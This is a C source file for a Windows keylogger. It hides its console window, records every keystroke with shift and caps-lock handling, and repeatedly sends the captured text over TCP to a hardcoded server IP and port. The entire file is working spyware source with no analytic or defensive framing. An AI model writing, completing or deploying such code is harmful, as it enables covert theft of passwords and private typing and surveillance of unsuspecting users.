#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
#define SERVER_PORT 2005
#define BUF_SIZE 4096

char BUFFER[BUF_SIZE] = {0};      // Main buffer to store captured keystrokes
char TEMP_BUFFER[BUF_SIZE] = {0}; // Temporary buffer for sending logs



DWORD WINAPI connect_to_server(LPVOID arg) {
    WSADATA wsaData;
    SOCKET sock;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);

    int conn = 1;
    while(1) {
        // Try to connect to the server
        conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
        
        // If the connection fails, reconnect
        if (conn == SOCKET_ERROR) {
            closesocket(sock);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            Sleep(1000);
            continue;
        }

        // Check if the buffer is filled with data
        if (strlen(BUFFER) > 0) {
            // Copy the main buffer into a temporary buffer
            snprintf(TEMP_BUFFER, sizeof(TEMP_BUFFER), "%s", BUFFER);

            // Send the copied data to the server
            if (send(sock, TEMP_BUFFER, strlen(TEMP_BUFFER), 0) == SOCKET_ERROR) {
                closesocket(sock);
                sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                continue;
            }

            // Clear the main buffer after sending the data
            memset(BUFFER, 0, sizeof(BUFFER));
        }

        // Sleep for a while before checking again
        Sleep(10000);
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
    return 1;
}

int main() {
    HWND hwnd = GetConsoleWindow(); // Get the console window handle
    ShowWindow(hwnd, SW_HIDE);      // Hide the window

    int lastKeyState[256] = {0};    // Track last state of each key
    int logIndex = 0;               // Index for storing BUFFER
    HANDLE server_handle = CreateThread(NULL, 0, connect_to_server, NULL, 0, NULL);

    while (1) {
        for (int i = 0; i < 256; i++) {
            // Check if the key was just pressed (transition from not pressed to pressed)
            if ((GetAsyncKeyState(i) & 0x8000) && !lastKeyState[i]) {
                char message[16] = {0};

                // Handle alphanumeric keys
                if (i >= 'A' && i <= 'Z') {
                    int capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                    int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);

                    if (capsLock ^ shiftPressed) { // XOR for uppercase
                        snprintf(message, sizeof(message), "%c", i); // Uppercase
                    } else {
                        snprintf(message, sizeof(message), "%c", i + 32); // Lowercase
                    }
                }
                // Handle numbers and shifted special characters
                else if (i >= '0' && i <= '9') {
                    int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);
                    if (shiftPressed) {
                        switch (i) {
                            case '1': strcpy(message, "!"); break;
                            case '2': strcpy(message, "@"); break;
                            case '3': strcpy(message, "#"); break;
                            case '4': strcpy(message, "$"); break;
                            case '5': strcpy(message, "%"); break;
                            case '6': strcpy(message, "^"); break;
                            case '7': strcpy(message, "&"); break;
                            case '8': strcpy(message, "*"); break;
                            case '9': strcpy(message, "("); break;
                            case '0': strcpy(message, ")"); break;
                            default: snprintf(message, sizeof(message), "%c", i); break;
                        }
                    } else {
                        snprintf(message, sizeof(message), "%c", i); // Unshifted number
                    }
                }
                // Handle spacebar
                else if (i == VK_SPACE) {
                    strcpy(message, " ");
                }
                // Handle special keys
                else {
                    switch (i) {
                        case VK_RETURN:  strcpy(message, "[Enter]"); break;
                        case VK_BACK:    strcpy(message, "[Backspace]"); break;
                        case VK_TAB:     strcpy(message, "[Tab]"); break;
                        case VK_ESCAPE:  strcpy(message, "[Esc]"); break;
                        case VK_SHIFT:   strcpy(message, "[Shift]"); break;
                        case VK_CONTROL: strcpy(message, "[Ctrl]"); break;
                        case VK_MENU:    strcpy(message, "[Alt]"); break;
                        case VK_CAPITAL: strcpy(message, "[CapsLock]"); break;
                        case VK_LEFT:    strcpy(message, "[Left]"); break;
                        case VK_RIGHT:   strcpy(message, "[Right]"); break;
                        case VK_UP:      strcpy(message, "[Up]"); break;
                        case VK_DOWN:    strcpy(message, "[Down]"); break;
                        case VK_HOME:    strcpy(message, "[Home]"); break;
                        case VK_END:     strcpy(message, "[End]"); break;
                        case VK_DELETE:  strcpy(message, "[Del]"); break;
                        default:
                            snprintf(message, sizeof(message), "[Unknown: %d]", i);
                            break;
                    }
                }

                // Append the keypress to the log buffer
                if (logIndex + strlen(message) < BUF_SIZE) {
                    strcat(BUFFER, message);
                    logIndex += strlen(message);
                } else {
                    logIndex = 0;
                    BUFFER[logIndex] = '\0';
                }
            }

            // Update last key state (pressed or not)
            lastKeyState[i] = (GetAsyncKeyState(i) & 0x8000) != 0;
        }

        Sleep(10); // Reduce CPU usage
    }

    return 0;
}
